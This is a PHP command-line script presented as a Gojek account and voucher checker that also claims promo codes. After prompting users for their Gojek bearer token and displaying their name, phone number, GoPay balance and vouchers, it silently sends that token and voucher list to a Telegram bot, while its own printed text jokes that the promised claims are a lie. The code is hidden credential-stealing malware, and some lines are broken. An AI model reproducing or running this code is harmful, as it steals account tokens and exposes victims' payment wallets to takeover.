<?php
echo color("green","[+] Token GOJEK Kamu Disini : ");
$token = trim(fgets(STDIN));
$secret = ''.$token.'';
$header = array();
$header[] = 'Content-Type: application/json';
$header[] = 'X-AppVersion: 3.46.2';
$header[] = "X-UniqueId: ".time()."57".mt_rand(1000,9999);
$header[] = 'X-Location : -6.255951,106.869717";
$header[] ='Authorization: Bearer '.$token;
$header[] = 'pin:'.$pin.'';
//CHECKER DETAIL AKUN
$info = curl('https://api.gojekapi.com/v1/chat/profile', null, $header);
    $verifs = json_decode($info[0]);
         $akun = $verifs->data->name;
         $nope = $verifs->data->phone;
   echo "\n";
   echo color("yellow","nama : ".$akun." \n");
   echo color("yellow","nomer : 0".$nope." \n");
//CHECKER SALDO GOPAY
$detail = curl('https://api.gojekapi.com/wallet/profile/detailed', null, $header);
         $saldoo = json_decode($detail[0]);
                $saldo = $saldoo->data->balance;
                    echo color("yellow","Sisa Saldo Gopay = $saldo \n");
//CHECKER VOUCHER YANG ADA
$detail_voucher = curl('https://api.gojekapi.com/gopoints/v3/wallet/vouchers?limit=10&page=1', null, $header);
     $vouchers = json_decode($detail_voucher[0]);
     $total_voucher = $vouchers->voucher_stats->total_vouchers;
     $nama_voucher = $vouchers->data[0]->title;
 $batas_voucher = $vouchers->data[0]->expiry_date;
 $nama_voucher1 = $vouchers->data[1]->title;
 $batas_voucher1 = $vouchers->data[1]->expiry_date;
 $nama_voucher2 = $vouchers->data[2]->title;
 $batas_voucher2 = $vouchers->data[2]->expiry_date;
 $nama_voucher3 = $vouchers->data[3]->title;
 $batas_voucher3 = $vouchers->data[3]->expiry_date;
 $nama_voucher4 = $vouchers->data[4]->title;
 $batas_voucher4 = $vouchers->data[4]->expiry_date;
 $nama_voucher5 = $vouchers->data[5]->title;
 $batas_voucher5 = $vouchers->data[5]->expiry_date;
 $nama_voucher6 = $vouchers->data[6]->title;
 $batas_voucher6 = $vouchers->data[6]->expiry_date;
 $nama_voucher7 = $vouchers->data[7]->title;
 $batas_voucher7 = $vouchers->data[7]->expiry_date;
 $nama_voucher8 = $vouchers->data[8]->title;
 $batas_voucher8 = $vouchers->data[8]->expiry_date;
 $nama_voucher9 = $vouchers->data[9]->title;
 $batas_voucher9 = $vouchers->data[9]->expiry_date;
 $nama_voucher10 = $vouchers->data[10]->title;
 $batas_voucher10 = $vouchers->data[10]->expiry_date;
 $nama_voucher11 = $vouchers->data[11]->title;
 $batas_voucher11 = $vouchers->data[11]->expiry_date;
 $nama_voucher12 = $vouchers->data[12]->title;
 $batas_voucher12 = $vouchers->data[12]->expiry_date;
 $nama_voucher13 = $vouchers->data[13]->title;
 $batas_voucher13 = $vouchers->data[13]->expiry_date;
 $nama_voucher14 = $vouchers->data[14]->title;
 $batas_voucher14 = $vouchers->data[14]->expiry_date;
       if ($vouchers->success == true) {
       echo "
";
       echo color("blue","Kamu Punya " . $total_voucher . " Voucher GOJEK
");
       echo "
";
       if ($total_voucher == 1) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
    } else {
    }
    if ($total_voucher == 2) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
    } else {
    }
    if ($total_voucher == 3) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
    } else {
    }
    if ($total_voucher == 4) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
    } else {
    }
    if ($total_voucher == 5) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher4 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher4 . '';
        echo "
";
    } else {
    }
    if ($total_voucher == 6) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher4 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher4 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher5 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher5 . '';
        echo "
";
    } else {
    }
    if ($total_voucher == 7) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher4 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher4 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher5 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher5 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher6 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher6 . '';
        echo "
";
    } else {
    }
    if ($total_voucher == 8) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher4 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher4 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher5 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher5 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher6 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher6 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher7 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher7 . '';
        echo "
";
    } else {
    }
    if ($total_voucher == 9) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher4 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher4 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher5 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher5 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher6 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher6 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher7 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher7 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher8 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher8 . '';
        echo "
";
    } else {
    }
    if ($total_voucher == 10) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher4 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher4 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher5 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher5 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher6 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher6 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher7 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher7 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher8 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher8 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher9 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher9 . '
';
        echo "
";
    } else {
    }
    if ($total_voucher == 11) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher4 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher4 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher5 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher5 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher6 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher6 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher7 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher7 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher8 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher8 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher9 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher9 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher10 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher10 . '
';
        echo "
";
    } else {
    }
    if ($total_voucher == 12) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher4 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher4 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher5 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher5 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher6 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher6 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher7 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher7 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher8 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher8 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher9 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher9 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher10 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher10 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher11 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher11 . '
';
        echo "
";
    } else {
    }
    if ($total_voucher == 13) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher4 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher4 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher5 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher5 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher6 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher6 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher7 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher7 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher8 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher8 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher9 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher9 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher10 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher10 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher11 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher11 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher12 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher12 . '
';
        echo "
";
    } else {
    }
    if ($total_voucher == 14) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher4 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher4 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher5 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher5 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher6 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher6 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher7 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher7 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher8 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher8 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher9 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher9 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher10 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher10 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher11 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher11 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher12 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher12 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher13 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher13 . '
';
        echo "
";
    } else {
    }
    if ($total_voucher == 15) {
        echo 'Voucher : ' . $nama_voucher . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher1 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher1 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher2 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher2 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher3 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher3 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher4 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher4 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher5 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher5 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher6 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher6 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher7 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher7 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher8 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher8 . '';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher9 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher9 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher10 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher10 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher11 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher11 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher12 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher12 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher13 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher13 . '
';
        echo "
";
        echo "
";
        echo 'Voucher : ' . $nama_voucher14 . '';
        echo "
";
        echo 'Kadaluarsa : ' . $batas_voucher14 . '
';
        echo "
";
  }
  }
 echo "\n".color("nevy","MAU CLAIM VOUCHER ?: y/n ");
        $pilihan = trim(fgets(STDIN));
        if($pilihan == "y" || $pilihan == "Y"){
        echo color("red","===========(CLAIM MULAI)===========")."\n";
	 }
        sleep (10);
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","🔓▶️ Message: ".$message);
        goto gocar;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
	      gocar:
        echo "\n".color("nevy","# CLAIM FOOD 35+30+25k");
        echo "\n".color("yellow","# TAPI BOHONG , WKWKWKWK ");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(15);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","🔓▶️ Message: ".$message);
        goto gofood;
        }else{
        echo "\n".color("red","🔐▶️ Message: ".$message);
        gofood:
        echo "\n".color("nevy","# CLAIM ULANG");
        echo "\n".color("yellow","SAMPE CROT");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(15);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520"}');
        $message = fetch_value($code1,'"message":"','"');
        echo "\n".color("green","🔓▶️ Message: ".$message);
        echo "\n".color("nevy","# CLAIM LAGI GOFOOD 15+10+5k");
        echo "\n".color("yellow","# SABAR YA , DIKIT LAGI KOK BIAR CROT");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(5);
        }
        sleep(15);
        $boba09 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD260520A"}');
        $messageboba09 = fetch_value($boba09,'"message":"','"');
        echo "\n".color("green","# Message: ".$messageboba09);
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=13&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
        $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
        $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
        $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
        $voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
        $voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
        $voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
        echo "\n".color("purple","🎫▶️ Total voucher ".$total." : ");
        echo "\n".color("nevy","                     1. ".$voucher1);
        echo "\n".color("nevy","                     2. ".$voucher2);
        echo "\n".color("nevy","                     3. ".$voucher3);
        echo "\n".color("nevy","                     4. ".$voucher4);
        echo "\n".color("nevy","                     5. ".$voucher5);
        echo "\n".color("nevy","                     6. ".$voucher6);
        echo "\n".color("nevy","                     7. ".$voucher7);
        echo "\n".color("nevy","                     8. ".$voucher8);
        echo "\n".color("nevy","                     9. ".$voucher9);
        echo "\n".color("nevy","                     10. ".$voucher10);
      	echo "\n".color("nevy","                     11. ".$voucher11);
        echo "\n".color("nevy","                     12. ".$voucher12);
        echo "\n".color("nevy","                     13. ".$voucher13);
        echo"\n";
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
        $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
        $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
        $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
        $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
        $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
        $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
        $TOKEN  = "0000000000:7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
      	$chatid = "";
      	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
      	$method	= "sendMessage";
      	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
      	$post = [
      		'chat_id' => $chatid,
                'text' => $pesan
        	];
                $header = [
                "X-Requested-With: XMLHttpRequest",
                "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
}
